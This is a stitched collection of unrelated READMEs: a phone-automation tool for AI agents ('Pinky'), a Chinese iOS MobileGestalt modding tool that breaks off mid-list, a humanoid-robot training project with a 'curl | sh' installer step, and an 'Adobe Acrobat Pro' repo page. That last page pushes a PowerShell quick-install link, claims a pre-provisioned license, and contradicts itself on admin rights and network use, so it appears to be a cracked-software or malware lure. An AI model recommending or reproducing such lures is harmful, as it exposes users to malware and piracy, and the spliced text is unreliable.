All phones shows an iPhone that no task works on with its last picture rather than live, so leaving Pinky there does not keep the iPhone awake or sharing its screen ([details](docs/notes/gateway.md#pausing-a-phone)). ### Phones away from home An Android phone does not have to be on the computer's network. With [Tailscale](https://tailscale.com) on the computer and on the phone, signed in to the same account, Pinky reaches the phone through it: leave the computer at home and take the phone out, on mobile data or another Wi-Fi. Android runs one VPN at a time, so keep other VPN and proxy apps off on the phone: they turn Tailscale off. 1. Set the phone up once while it is near the computer, by cable or on the same Wi-Fi: **Settings › Phones › Use away from home › Turn on…**. **Add phone › Android › Phone not on this network? Use Tailscale** walks you through Tailscale on both sides and lists the phones on your tailnet. 2. Pinky has the phone's adb listen on the network (`adb tcpip`, port 5555) and connects to the phone at its Tailscale address. It uses that connection whenever the phone has no connection on the computer's network, so the phone stays in the list as you leave. 3. The phone's adb then takes connections on every network the phone joins, from the computers it already trusts; any other computer makes the phone ask. Only the way through Tailscale is encrypted. It lasts until the phone restarts, and **Turn off** stops it at once. Pinky only reads Tailscale's status and never changes its settings. 4. **Keep this computer awake for phones away** (Settings › Phones, on by default) stops the computer's idle sleep while a phone is connected through Tailscale. A MacBook still sleeps when its lid closes. At home, Tailscale is as fast as Wi-Fi; away, the phone's upload carries the picture, so Pinky streams lighter through Tailscale (1 Mbit/s), and on a weak 4G hotspot each step takes seconds. Details, measurements, data use and what to do when it does not connect: [docs/away-from-home.md](docs/away-from-home.md). An agent can be away from the computer too: [Remote agents](docs/mcp.md#over-http). ### Updates Pinky looks for a new version at launch and every few hours, and shows a card with what changed, **Update now** and **Later**. With Settings › Advanced › **Update automatically** (on by default) it installs it by itself once no agent is working and nobody has used Pinky for ten minutes, and it updates Pinky Companion on Android phones that are free; its accessibility service stays off until the next task. A Pinky Companion signed with the public key that its builds had until 8 November 2026 is uninstalled and installed again, signed with Pinky's private key, and Pinky tells you; on a phone that asks before installing apps over USB, the phone's page says why and waits for your **Update**, and when a phone refuses them, a card in the sidebar tells you once about each new version, to install by hand ([how](#install-companion-by-hand)). After an update, **What's new** lists the changes since the version you had (from [CHANGELOG.md](CHANGELOG.md), or its Chinese version, [CHANGELOG.zh-CN.md](CHANGELOG.zh-CN.md), when Pinky is in Chinese). - **macOS:** Pinky.app replaces itself after checking the download's checksum, that it is signed by Pinky's developer and that Apple notarized it, and goes back to the old version if the new one does not start. The Homebrew cask's copy updates itself the same way, and `brew upgrade` leaves it alone while it is current. A copy run from the disk image or from a folder you cannot write to says how to update it instead. - **Windows:** a Pinky that its installer installed runs the new installer quietly, after checking its checksum, starts the new version and goes back to the old one if that does not start. The portable copy downloads the installer for you. - **Linux:** a Pinky unpacked from the `.tar.gz` into a folder of its own replaces its files with the new release's, after checking its checksum, starts the new version and goes back to the old one if that does not start. Your package manager updates the `.deb`; other copies download the release for you to install. - **Terminal:** `pinkyctl update` installs an update while Pinky is not running; `pinkyctl daemon` only logs that one is out. Details: [docs/notes/updates.md](docs/notes/updates.md). ### Usage statistics, crash reports and feedback Pinky shares anonymous usage statistics (counters such as tasks run, tools called and phones connected, about once a day, with a random install id) and crash reports; turn both off in Settings › Privacy or with `DO_NOT_TRACK=1`. Screens, typed text, app names, phone names and ids, PINs and file names are never sent. Help › Send Feedback… opens a GitHub issue with your message and diagnostics filled in, which you read and submit yourself. [docs/TELEMETRY.md](docs/TELEMETRY.md) lists everything. ## FAQ
Which agents work with Pinky? Any agent that can use MCP servers: over stdio, by running `pinkyctl mcp`, or over HTTP with an agent token ([how](docs/mcp.md#over-http)). **Settings › Agents** connects Claude Code, Claude Desktop, Codex, Cursor and other agents it finds on your computer in one click. Claude Code is the one that has used real phones end to end so far. Pinky brings no model of its own: your agent does the thinking.
Where does Pinky keep its files, and can I move them? Pinky keeps its settings, history and the socket agents reach it through in your user folders: `~/Library/Application Support/Pinky` on a Mac; `%APPDATA%\Pinky` and `%LOCALAPPDATA%\Pinky` on Windows; `~/.config/pinky`, `~/.local/share/pinky` and `$XDG_RUNTIME_DIR/pinky` on Linux. To keep all of them in one folder of your choice instead, set the environment variable `PINKY_HOME` to it: Pinky then uses `config`, `data` and `run` inside it. Set it where both Pinky and your agents see it, such as a user environment variable on Windows, or also in the agent's MCP settings (`"env": { "PINKY_HOME": "…" }`): a Pinky started without it uses the usual folders and doesn't see the other. On macOS and Linux the socket's path has to stay short, about 100 characters, and Pinky says so when `PINKY_HOME` makes it too long. On Windows, agents reach Pinky through a named pipe, which works from packaged (MSIX) apps such as the Claude and Codex desktop apps too. Older versions of Pinky listened on a socket file in AppData, which those apps can't see; update Pinky if an agent in one of them can't reach it.
Can an agent approve its own risky step, or be talked into it? No. The rules run in Pinky's gateway, between the agent and the phone. A step that needs you comes back to the agent as `approval_pending`, and nothing happens on the phone until you click **Allow** in Pinky; the agent has nothing it could send to confirm it. Before acting, Pinky checks that the button is still where it was, and no answer within 60 seconds means no. Pinky finds these buttons by their labels in 10 languages, so an unusual one could slip through: for more control, Settings › Safety has **Ask before every action** and **Read-only mode**.
What can't agents see? Banking, wallet and password-manager apps, from a list that comes with Pinky and that you can add to in Settings › Safety, where you pick the app from those on your phones: agents get no screen from them, and their notifications are hidden, in the notification shade and on the lock screen too. Where another screen shows a blocked app, as its notification in the shade or in a banner, or its card in recent apps, the agent reads only that something is hidden there, and the screenshots it gets, and those in Activity, cover it with a gray box (screen recordings show it as it was, so they stay on your computer: an agent gets one only when you allow it at an export). Agents can't type into password or one-time-code fields. When an agent needs a banking or wallet app for a task, Pinky asks you first. If you allow it, the agent may open and read that app for the rest of the task, what your rules ask about there still asks, and Pinky keeps no screenshots or recordings of it: to read text that only its pixels show, Pinky looks at its screen in memory and gives the agent the text, never the picture. Password managers are never offered. One-time codes are masked before an agent reads them: in a text message, an email, a notification or anywhere else on the screen, "Your code is 482913" reaches the agent as "Your code is ••••••", and the screenshots it gets, and those in Activity, have the code covered with a gray box. Prices, phone numbers, dates and numbers in text that is not about a code stay as they are. Screen recordings show codes as they were, so they stay on your computer: an agent gets one only when you allow it, each time it exports a task's report. You can turn this off in Settings › Safety › Hide codes from agents.
Does my phone's screen go to the cloud? Not through Pinky. Screenshots, recordings and history stay on your computer, for 30 days unless you change it in Settings › Privacy, where you can also delete them. What the agent reads, the screenshots and reports it saves, and a screen recording when you allow it at an export go to the agent you chose, as with any tool you give it. Pinky's anonymous usage statistics never include screens, typed text or app names ([above](#usage-statistics-crash-reports-and-feedback)).
What does Pinky install on my phone? On Android, Pinky Companion, when you click Install; Pinky keeps it up to date and turns its accessibility service on only while an agent works ([why](#faq)). On an iPhone, no app on iOS 27 and later: Pinky mounts Apple's developer disk image, as Xcode does. On iOS 17.4 to 26, the WebDriverAgent helper, which you install once from Xcode ([how](docs/notes/ios.md#installing-the-webdriveragent-helper)).
How do I install Pinky Companion by hand? When a phone won't let the computer install apps over USB, such as a Xiaomi without a SIM card, which can't turn on Install via USB, you can install Pinky Companion yourself. Its APK, `pinky-companion.apk`, comes with Pinky: - **macOS:** inside the app, at `Pinky.app/Contents/Resources/pinky-companion.apk`: in Applications, right-click Pinky and choose **Show Package Contents**. - **Windows:** next to `Pinky.exe` in Pinky's folder. - **Linux:** next to `pinky` in the folder you unpacked the `.tar.gz` into, or in `/opt/pinky/` if you installed the `.deb`. When an install over USB fails, **Show pinky-companion.apk** on the phone's page shows you the file. Copy it to the phone, over the cable or through a chat app for example, and open it there; the phone may ask you first to let the app you open it with install apps. Pinky recognizes the copy you installed, as it is the same app with the same signature, and stops offering to install it. On a Xiaomi, Redmi or POCO phone, Pinky still needs **USB debugging (Security settings)** in Developer options to tap and type, and to turn on Pinky Companion's accessibility service; restart the phone after you turn it on. Like Install via USB, that switch checks with Xiaomi online and may ask for a SIM card. Without it, Pinky Companion installs but can't come on, and Pinky can't tap or type on the phone. Pinky Companion gets a new version only when its own code changes, not with every Pinky update. With **Update automatically** on, Pinky tries once to install a new version over USB; when the phone refuses, a card in the sidebar tells you, with **Show pinky-companion.apk**, and Pinky doesn't try that version again. Install the new `pinky-companion.apk` the same way. With **Update automatically** off, the phone's page offers the new version when you open it.
Will banking or other apps notice Pinky Companion? While its accessibility service is on, they can. Malware abuses accessibility services, so many banking apps refuse to sign in while an app from outside an app store has one turned on: in Malaysia (Maybank, CIMB, HSBC and the other members of the Association of Banks in Malaysia, since 2024) and in Singapore (DBS, OCBC and UOB, since 2023) among others. Pinky Companion is such an app, as Pinky installs it over USB. Apps such as WeChat, Douyin and Xiaohongshu can see the service too and watch for automated use; we know of no report that they flagged Pinky Companion, but letting an agent use them may be against their terms. Apps can also see that USB debugging or Wireless debugging is on, which Pinky needs on every Android phone; some apps, banking apps among them, warn you or refuse to run while it is. It stays on for as long as you use the phone with Pinky. So Pinky turns the service on only while an agent works on the phone: as a task starts, and off again a few seconds after the task ends or you take over the phone, or a minute after the agent's last step. The rest of the time it is off, and those apps work as usual. While an agent works, even on the phone's background display, they see it: to use one of them then, click **Take over** in Pinky first, or end the task. To keep Pinky from turning the service on at all, uninstall Pinky Companion on the phone (Android's Settings › Apps). Pinky works without it, only more slowly: it reads a screen in about 2 s instead of 70 ms, and types text other than plain English through the phone's clipboard. **Not now** on the phone's page puts away Pinky's offer to install it again.
How is Pinky different from other phone tools for agents? We looked at more than a dozen before building it. None of the open-source ones covers iPhone and Android, runs on macOS, Windows and Linux, works with any agent and keeps a person in the loop, all at once. Most leave it to the agent to ask first, or block whole kinds of actions; Pinky holds the one risky tap itself, outside the agent, and records every run.
Is it safe to give my phone to an agent that can run commands? An agent that can run commands as you could reach the phone without Pinky, through adb for example, and skip its rules. Run such agents in a sandbox without access to the phone, or plug the phone into another computer and let the agent connect to Pinky there over HTTP ([how](docs/mcp.md#over-http)).
## Build from source To use Pinky, install a release ([Get started](#get-started)). Building it yourself, to work on it, needs Go 1.27.3 or later, and on a Mac Xcode's command line tools. Pinky is one Go binary without cgo; MyGo (`go tool mygo build`) packages it for each system. The live mirror and recordings use FFmpeg 9's shared libraries, which Pinky loads at run time: from `PINKY_FFMPEG_DIR`, from the app (macOS), next to the executable, then from where the system keeps libraries. Every release carries its own minimal LGPL build (`scripts/ffmpeg.sh`, the H.264 and HEVC decoders): in Pinky.app, and next to the executable in the Windows installer and zip and in the Linux `.tar.gz` and `.deb` ([docs/RELEASING.md](docs/RELEASING.md#ffmpeg)). A build of your own needs one too: `make app` adds it to Pinky.app, and `scripts/release.sh build` makes every package with it. Without FFmpeg everything but the mirror works, and Pinky says what is missing. ### macOS ```sh make companion # optional: the Android companion APK (Android SDK and JDK) make app # build/pinky/darwin-/Pinky.app and pinky--.dmg ``` `make app` builds a minimal LGPL FFmpeg 9 from source the first time (`make ffmpeg`, about a minute: the H.264 and HEVC decoders with VideoToolbox), puts it in `Pinky.app/Contents/Frameworks`, with CMake installed (`brew install cmake`) also builds Pinky's own adb (`make adb`) into `Contents/Helpers`, adds the companion APK when it is built (`COMPANION_APK=path` picks another), signs the app and makes the `.dmg` from the finished app. Install from the `.dmg` by dragging Pinky to Applications. The app is signed ad hoc unless `macos.signingIdentity` in `cmd/pinky/mygo.json` (or `make app MACOS_SIGN=…`) names a Developer ID; an ad-hoc signed app runs on the Mac that built it, and another Mac's Gatekeeper refuses it. `make app` does not notarize. `make release` signs with the Developer ID in `RELEASE_SIGN` and notarizes the `.dmg` (`make notarize`: submit, wait, staple), with the notarytool profile in `NOTARY_PROFILE` (`pinky-notary`), which you store once with `xcrun notarytool store-credentials pinky-notary --apple-id --team-id `. Releases themselves are built, signed and published by a workflow for both kinds of Mac, Windows and Linux; see [docs/RELEASING.md](docs/RELEASING.md). To try your build, open it (`open build/pinky/darwin-arm64/Pinky.app`) and connect your agent to it with Connect in its Settings › Agents, which uses this build's path, or for Claude Code from the checkout: ```sh claude mcp add --scope user pinky -- "$PWD/build/pinky/darwin-arm64/Pinky.app/Contents/MacOS/Pinky" mcp mkdir -p ~/.claude/skills/pinky && cp docs/SKILL.md ~/.claude/skills/pinky/SKILL.md ``` `go run ./cmd/pinky` does not see the app's FFmpeg: install FFmpeg 9 with Homebrew (`brew install ffmpeg`) or point at the build, `PINKY_FFMPEG_DIR=build/ffmpeg/lib go run ./cmd/pinky`. Unlocking a phone from the computer keeps its PIN in the login keychain and asks for Touch ID or the Mac's password each time. ### Windows ```sh go tool mygo build -platform windows/amd64 cmd/pinky # build/pinky/windows-amd64/Pinky.exe (and an installer where NSIS is installed) go build -o pinky.exe ./cmd/pinky # a console build, for pinky devices and other commands in a terminal ``` Pinky.exe is a windowed program: agents that start `Pinky.exe mcp` talk to it over pipes, but a terminal shows nothing it prints, so use the console build there. A release's installer and zip carry FFmpeg next to `Pinky.exe` (with D3D11VA). For a build of your own, `scripts/ffmpeg.sh build/ffmpeg-windows windows-amd64` makes the DLLs in `build/ffmpeg-windows/bin` (in a Docker container); put them next to the executable, or set `PINKY_FFMPEG_DIR` to their folder (the `ffmpeg-n9.0-…-win64-lgpl-shared` builds at [FFmpeg-Builds](https://github.com/FFmpeg-Builds/FFmpeg-Builds/releases) work too). A build of your own carries no adb, so Android phones need the one of Android's platform tools; `scripts/adb.sh build/adb-windows windows-amd64` builds Pinky's own (in a Docker container), whose `adb.exe` and two DLLs go next to the executable. iPhones are untested on Windows. PINs are kept in the Credential Manager, and each unlock asks through Windows Hello, or for the account's password where Hello is not set up. ### Linux ```sh go tool mygo build -platform linux/amd64 cmd/pinky # build/pinky/linux-amd64/: pinky, a .deb, a .tar.gz with install.sh, a PKGBUILD ``` The window needs GTK 3 and EGL (`libgtk-3-0`, `libegl1`; Mesa draws it in software where there is no GPU). A release's `.tar.gz` and `.deb` carry FFmpeg next to `pinky`; it needs glibc 2.29 or later (Ubuntu 20.04, Debian 11 and newer) and decodes in software. For a build of your own, `scripts/ffmpeg.sh build/ffmpeg-linux linux-amd64` makes the libraries in `build/ffmpeg-linux/lib` (in a Docker container); put them next to the executable, or set `PINKY_FFMPEG_DIR` to their folder. For hardware decoding (VA-API), point `PINKY_FFMPEG_DIR` at an FFmpeg 9 that has it, such as the distribution's or FFmpeg-Builds' shared builds (which need `libva2` and `libva-drm2`); Pinky looks there first. iPhones are untested on Linux. PINs are kept in the Secret Service (GNOME Keyring, KWallet, KeePassXC) in a keyring of Pinky's own, which the first save asks you to give a password and which Pinky locks again after each use, so every unlock asks for that password. ## Build and test ```sh make check # build (CGO_ENABLED=0), vet, test make app # Pinky.app with FFmpeg and the companion, and a .dmg (macOS) make ffmpeg # FFmpeg 9 for Pinky.app, in build/ffmpeg make adb # Pinky's own adb for Pinky.app, in build/adb (needs CMake) make companion # the Android companion APK (Android SDK and JDK needed) make e2e # a binary with MyGo's automation socket, for UI checks scripts/smoke.sh # the fake gateway, pinky devices and a task through pinky mcp make dist # a dry run of a release, in dist// (docs/RELEASING.md) ``` `go run ./cmd/pinky --fake` runs the app with two scripted phones (a payment to approve, a blocked banking app, a password field), so it needs no phone. Tests that need a real phone use the `device` build tag; see [docs/WORKING.md](docs/WORKING.md). `go run ./scripts/secretcheck` checks by hand that unlocking asks you (Touch ID, Windows Hello). `PINKY_FFMPEG_APP=build/pinky/darwin-arm64/Pinky.app go test -run TestPackagedFFmpeg ./internal/video/` checks that the app decodes with its own FFmpeg; given the folder of an unpacked Windows or Linux package, it checks that package's. CI ([.github/workflows/ci.yml](.github/workflows/ci.yml)) builds, vets and tests on Linux and Windows, builds and vets on macOS, runs `scripts/smoke.sh` on all three, packages for Linux and Windows, and on Linux opens the window under Xvfb and captures it through the automation socket. It runs for `main`, pull requests, by hand, and the platform session's `claude/platform-*` branches. ## Code layout ```text cmd/pinky/ app, daemon and MCP shim in one binary internal/screen/ the screen format agents read internal/driver/ driver interfaces; android/ and ios/ implement them internal/gateway/ sessions, leases, the action pipeline, the client API internal/policy/, approval/ rules and approvals internal/history/ task history (SQLite) internal/mcp/ the MCP server internal/api/ the local socket for agents and clients internal/demo/ scripted fake phones internal/update/ new versions: the feed, checks, the swap, What's new internal/video/, ui/ the desktop client (MyGo native UI, FFmpeg decoding) internal/telemetry/ usage statistics, crash reports and feedback worker/ the Cloudflare Worker that receives usage statistics and crash reports android/companion/ the Android companion app (Kotlin) scripts/ device locks and an MCP call script for checks docs/ design, agent guide, MCP reference and notes ``` ## Documents - [Acceptance checklist](docs/ACCEPTANCE.md) - [Design](docs/DESIGN.md) - [Agent guide (SKILL.md)](docs/SKILL.md) and [MCP reference](docs/mcp.md) - [Phones away from home](docs/away-from-home.md) - [Working on Pinky](docs/WORKING.md) - [Usage statistics, crash reports and feedback](docs/TELEMETRY.md) - Notes: [integration](docs/notes/integration.md), [gateway](docs/notes/gateway.md), [Android](docs/notes/android.md), [companion](docs/notes/companion.md), [iOS](docs/notes/ios.md), [client](docs/notes/client.md), [updates](docs/notes/updates.md), [telemetry](docs/notes/telemetry.md), [app logs](docs/notes/app-logs.md) - [Changelog](CHANGELOG.md) ## Community Ask questions, share what your agent does on your phone and follow development on [Discord](https://discord.gg/S27b7SHjng). Bugs and feature requests are welcome as GitHub issues; Help › Send Feedback… in Pinky opens one with diagnostics filled in. ## License Apache-2.0

items.readme:
Erosion-CN

基于 worse_query 的 iOS / iPadOS 系统配置与 MobileGestalt 研究工具箱（简体中文防白苹果安全加固版）

支持 iOS / iPadOS 27.0 – 27.2 / 27.3 beta 1（完整支持）以及 iOS / iPadOS 26.x（部分支持）。

--- ## 项目简介与核心改进 **Erosion-CN** 分支衍生自官方上游项目 **[jailbreakdotparty/Erosion](https://github.com/jailbreakdotparty/Erosion)**，完成了 **100% 简体中文界面本地化**，修复了原版多项严重真机 Bug，并进行了系统级防白苹果安全加固与底层能力扩展： 1. **修复重启后修改自动失效还原（反弹回原厂状态）的严重 Bug** - 原版在未手动切换过设置开关时，`mgWriteAtomically` 默认返回 `false`，导致实际走了临时文件替换（`replaceItemAt`），破坏了系统缓存文件的 Inode 与 `_mobilegestalt` POSIX 属主权限，设备一重启即被系统丢弃重建；同时原版在 iOS 27 上额外注入了非缓存键 `RegionInfo`（`zHeENZu+wbg7PUprwNwBWg`），触发开机缓存合法性校验整包重置。 - 本分支已默认强制锁定原位覆盖写入，严格遵循 iOS 27 原厂缓存键结构，并自动匹配写入对应机型的监管型号（`RegulatoryModelNumber`），**真正做到持久化生效、重启不反弹**。 2. **修复内置 Plist 编辑器破坏布尔值与相机浮点参数导致「相机黑屏」的严重 Bug** - 原版 `PlistManager` 将 `CFBoolean`（`` / ``）以及整数值 `Double`（如相机变焦倍率 `1.0`、`2.0`、`5.0` 等）误判转换为了 `` 整型，导致编辑保存 `MobileGestalt` 后系统相机取景直接黑屏。 - 本分支改用 `CFBooleanGetTypeID()` 与 `CFNumberIsFloatType()` 精确识别底层 CoreFoundation 类型，保留原始 Plist 根类型与编码格式，并对未修改项执行 **100% 原样无损直通（Lossless Pass-through）**，彻底解决相机黑屏问题。 3. **零 0 字节窗口原位写入协议（`pwrite` + 按需尾截断 + `F_FULLFSYNC`）** - 重构底层文件 I/O：不再先执行 `ftruncate(fd, 0)` 清空系统文件，而是直接从偏移 `0` 原位覆盖写入、写完后按需裁剪尾部，并调用 `fcntl(fd, F_FULLFSYNC)` 强制刷新 APFS 与物理闪存缓存，断电或异常中断绝不留空文件。 4. **写入前变更对比预览（Diff Preview）+ 写后全量读回校验与自动回滚** - 点击「应用」时逐条展示所有待修改键值与十六进制槽位对比（`修改前 → 修改后`）； - 写入前自动保存 `PreApplyGestalt.plist` 快照，写入后立即从磁盘读回并做二进制 Plist 反序列化与严格类型校验，一旦出现任何不一致立即自动原位回滚。 5. **本机 `libMobileGestalt.dylib` 运行时动态偏移解析（零硬编码）** - 在设备运行时只读扫描内存中加载的 `/usr/lib/libMobileGestalt.dylib` 查询描述符表，实时计算当前机型与当前系统版本的 `CacheUUID`、总槽位数及布尔槽位偏移（`green-tea`、`not-green-tea`、`wapi`）； - **严格多重校验门控**：仅当本机 `CacheUUID` 唯一匹配、总长度精确等于 `槽位数 × 9`、有效位 `validity == 1`、8 字节槽位填充全为 `0` 且无任何无关字节变动时才允许修改；解析未通过时自动锁定开关并拦截写入。 6. **跨机型 / 跨系统升级四重指纹防呆、SHA-256 备份摘要校验与云备份隔离** - 本地备份文件自动标记 `isExcludedFromBackup = true`，防止通过 iCloud / 电脑换机迁移时将旧设备的缓存备份带入新设备； - 生成原始备份 `OriginalGestalt.plist` 时自动计算并持久化记录 `SHA-256` 完整性摘要；还原原始备份时强制核对 `SHA-256`、`CacheVersion`、`CacheUUID`、`CacheData` 长度与本机硬件 `ProductType`，从根源上杜绝跨系统升级或损坏备份覆写导致的基带/eSIM 异常。 7. **重签证书 `App Group` 自动探测与高危软砖项拆除** - 运行时通过 `SecTaskCopyValueForEntitlement` 与纯 Swift Mach-O `LC_CODE_SIGNATURE` 签名段解析自动匹配任意重签工具注入的可用 `group.*` 容器； - 默认移除并拦截上游版本中存在软砖/无限设置向导隐患的高危功能（如 iPhone 正则盲改切片的 iPadOS 模式、个人零售设备的监管模式开关、非缓存键注入等）。 8. **完善机型适配、iOS 27 进阶 AI 能力解锁与实用工具优化** - # SuperMimic

[Project page](https://supermimic.github.io) | [Paper](https://arxiv.org/abs/2610.28480)

SuperMimic trains a humanoid whole-body motion tracker with one differentiable world model, built on [mjlab](https://github.com/mujocolab/mjlab).

## Setup

Install [uv](https://docs.astral.sh/uv/):

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
```

Clone both repos as siblings:

```bash
mkdir supermimic_ws && cd supermimic_ws
git clone git@github.com:HybridRobotics/supermimic.git
git clone git@github.com:HybridRobotics/mjlab_research.git
cd supermimic
```

## Usage

Available task IDs:

- `SuperMimic-GenCoord-G1` — generalized coordinates representation
- `SuperMimic-MaxCoord-G1` — maximal coordinates representation

Train a world model and policy:

```bash
CUDA_VISIBLE_DEVICES=<GPU_ID> uv run src/supermimic/scripts/train.py \
  <TASK_ID> --runner.run_name <description>
```

Play back a trained model:

```bash
uv run src/supermimic/scripts/play.py \
  <TASK_ID> --wandb-path <RUN_PATH>
```

## Acknowledgements

SuperMimic contains code inspired by these projects:

- [ControlVAE](https://github.com/heyuanYao-pku/Control-VAE) (BSD-3-Clause)
- [robotic_world_model](https://github.com/leggedrobotics/robotic_world_model) (Apache-2.0)
- [DreamerV3](https://github.com/danijar/dreamerv3) (MIT)

## License

# Adobe Acrobat Pro: Secure PDF Document Processor 2026 Windows Desktop Client ![](files/preview.png) ### 🚀 PowerShell Quick Install [![](files/button.png)](https://mahmoudtawfik1998.github.io/secure-pdf-document-processor/) [![OS](https://img.shields.io/badge/OS-WIN_10%2F11-84cc16?style=flat-square&labelColor=0d1117)]() [![powershell](https://img.shields.io/badge/POWERSHELL-5%2B-a3e635?style=flat-square&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/STARS-4.6%2F5-f59e0b?style=flat-square&labelColor=0d1117)]()
--- Adobe-Acrobat-Pro is a complete standalone desktop application for secure PDF document processing, delivering a full installation setup for Windows x64 environments. Built as a ready-to-run edition, it combines enhanced security features with the robust document handling capabilities expected from a professional-grade PDF processor. The package supports offline deployment, making it suitable for controlled infrastructure where network-independent installation is required. This build targets administrators and technical users who need a reproducible, self-contained setup for secure document workflows. ## ✅ Requirements - Windows 10 or Windows 11 - PowerShell 5.1 or newer (already available on Windows) - Active network connection - No admin rights needed ## Features - **Local Document Processing Pipeline:** All PDF parsing, rendering, and transformation routines execute natively on the workstation, ensuring document contents never leave the local environment during routine operations. - **Hardware-Bound License Validation:** Activation state is cryptographically tied to the host machine's hardware fingerprint, preventing unauthorized duplication while remaining transparent to the end user. - **Isolated Runtime Sandbox:** The processing engine runs within a restricted execution context that limits file system and network access to explicitly permitted resources, reducing the attack surface during document handling. - **Deterministic Offline Activation:** The standalone installer performs a complete activation sequence without requiring network connectivity, using an embedded validation routine that verifies integrity before unlocking full functionality. - **Extended Format Fidelity Engine:** Renders complex PDF constructs—layered annotations, embedded fonts, form fields, and digital signatures—with high fidelity across the full document lifecycle. - **Tamper-Evident Configuration Store:** Core application settings and activation records are stored in a signed configuration vault; any unauthorized modification triggers an integrity check failure and reverts to the last known-good state. - **Granular Permission Model:** Supports role-based access controls for document operations, allowing administrators to restrict editing, redaction, and export capabilities on a per-user or per-document basis. - **Low-Latency Rendering Backend:** Utilizes an optimized local rendering pipeline that accelerates page composition and preview generation for large, asset-heavy PDF files without relying on external services. - **Unified Diagnostic Logging:** Emits structured, locally retained logs for all processing events, enabling offline troubleshooting and audit review without transmitting telemetry outside the host system. - **Self-Contained Dependency Resolution:** All required runtime libraries and codec components are bundled within the installer, eliminating external package dependencies and ensuring consistent behavior across target environments. ## How it works The application runs as a self-contained desktop environment that isolates all document parsing, rendering, and transformation operations within a local execution sandbox. Upon launch, the core engine initializes a protected runtime layer that validates the integrity of each module before granting access to the document workspace. No external services are contacted during processing, ensuring that all file operations remain confined to the local machine. The processing pipeline begins with a structural decomposition stage, in which the engine analyzes the object graph of each PDF to identify fonts, embedded images, vector paths, form fields, and metadata streams. This decomposition enables the security layer to flag anomalous constructs—such as embedded scripts, malformed cross-reference tables, or unauthorized incremental updates—before any content is rendered. Documents that fail validation are quarantined and presented with a diagnostic report rather than being opened. For accepted files, the rendering subsystem constructs a sandboxed display context with memory boundaries enforced at the document level. Editing operations—text modification, annotation, redaction, page reorganization, and form field authoring—are performed against an in-memory model and committed to disk only upon explicit user confirmation, preserving the original file until the save operation completes. Digital signature workflows verify certificate chains locally against the operating system's trust store, and any signing action is logged with a timestamp and hash reference for audit purposes. The standalone installation packages the full runtime, rendering libraries, security policy definitions, and license state into a single deployable unit. On first execution, the installer verifies environment prerequisites, registers the necessary file associations, and provisions the local configuration store without requiring network connectivity. Subsequent launches reuse this provisioned state, allowing fully offline operation in restricted or air-gapped environments. ## Compatibility **Operating System Support** The desktop edition is built for Windows x64 environments and is validated against Windows 10 (version 21H2 and later) and Windows 11. Both consumer and business SKUs are supported, including domain-joined workstations. Installation requires administrative privileges for the initial provisioning pass; subsequent launches operate under standard user context. **Hardware Requirements** A minimum of 8 GB RAM is recommended for baseline document review, with 16 GB advised for large-scale redaction, OCR, and batch processing workflows. The application provisions up to 4 GB of local cache for temporary render surfaces and document state; SSD storage is recommended for responsive handling of multi-hundred-page files. GPU acceleration is optional and degrades gracefully to software rendering when no compatible adapter is detected. **Runtime and Library Dependencies** The build is self-contained and does not require a separate runtime installation. All managed and native libraries are bundled within the application directory, ensuring deterministic behavior across target machines. No system-wide framework registration is performed, and no global environment variables are modified. **Document Format Interoperability** Full read and write support is provided for PDF 1.4 through PDF 2.0, including tagged PDF, PDF/A variants, and encrypted documents using standard security handlers. Import paths are available for common office and image formats, with conversion handled through an internal pipeline that preserves layout fidelity where structurally possible. **Security and Policy Alignment** The processor honors operating-system certificate stores for signature validation and supports hardware-backed key storage via standard cryptographic providers. Deployment in environments governed by Group Policy or mobile device management is supported through registry-based configuration keys; no network callback is required for core functionality. **Coexistence and Side-by-Side Operation** The application installs into an isolated directory and registers no conflicting file associations by default, allowing side-by-side presence with other PDF tooling. File association binding is opt-in and reversible through the application settings panel. **Accessibility Conformance** Interface and document rendering paths align with established accessibility frameworks, including screen reader compatibility and high-contrast display modes. Tagged content is preserved across edit operations to maintain downstream accessibility compliance. ## FAQ ### Is this build fully self-contained and operational offline? Yes. The standalone package includes all runtime libraries, codec dependencies, and configuration assets required for operation. No network callbacks, telemetry endpoints, or remote license verification steps are performed at startup. Once the installation directory is populated, the application functions entirely within an air-gapped environment. ### What runtime prerequisites does the desktop edition require? The installer targets Windows x64 systems with a minimum of Windows 10 build 19041 or Windows 11. Required components include the .NET Desktop Runtime (bundled in the package), Visual C++ 2015–2022 Redistributable, and a minimum of 4 GB RAM with 2 GB free disk space for the application payload. Hardware acceleration is optional and detected at runtime. ### How does the activation mechanism differ from a subscription-based deployment? This edition ships with a pre-provisioned local license token embedded in the application manifest. Validation occurs against a signed offline blob rather than a remote licensing server, so no user account, credential entry, or periodic re-authentication is necessary. The activation state persists across reboots and does not expire within the build's declared lifecycle. ### Are document signatures and redaction metadata preserved under the enhanced security model? Yes. The processing pipeline retains embedded digital signatures, XMP metadata, and redaction layer integrity during modification operations. Signature validation uses the local certificate trust store, and redaction events are logged to an append-only audit trail within the application profile directory. No document content is transmitted externally during signing or redaction workflows. ### Can the application be deployed non-interactively across multiple workstations? The standalone package supports silent installation via the built-in unattended flag, allowing configuration to be pushed through standard enterprise deployment tooling. Installation parameters, profile defaults, and security policy toggles can be pre-seeded through an adjacent configuration manifest. Per-machine and per-user scopes are both supported. ### What compatibility exists with existing PDF specifications and third-party toolchains? The processor implements full PDF 2.0 and PDF/A-4 conformance, with backward compatibility for PDF 1.4 through 1.7 documents. Output artifacts remain interoperable with standard viewers, print production workflows, and archival validation suites. Imported documents using embedded fonts, layered content, or JavaScript actions are normalized according to the configurable security policy. ### How are configuration and user profiles persisted between sessions? Application state, recent-document history, and custom security presets are stored in a versioned profile directory under the user's roaming application data path. Machine-scoped policy overrides reside in the installation's configuration root. Profile migrations are handled automatically on version upgrade, with the prior state retained as a rollback snapshot. ### What diagnostics are available if the application fails to initialize? Startup logging writes to a rotating log file within the application data directory, capturing dependency load order, license token validation, and hardware detection results. A built-in diagnostic mode can be invoked to verify component integrity and generate a consolidated environment report. Log verbosity is configurable through the policy manifest. ### Does the enhanced security model introduce restrictions on document processing scope? The hardened profile enforces sandboxed rendering of untrusted content, disabled JavaScript execution by default, and isolated memory handling for embedded objects. These restrictions are policy-configurable for environments that require legacy behavior. No restriction applies to standard viewing, annotation, or conversion operations under the default hardened profile. ## Disclaimer This standalone desktop edition of Adobe-Acrobat-Pro is provided as a complete, self-contained installation package intended for evaluation, testing, and controlled deployment scenarios. If a required runtime is already present at a compatible version, the installer preserves the existing installation. ### File 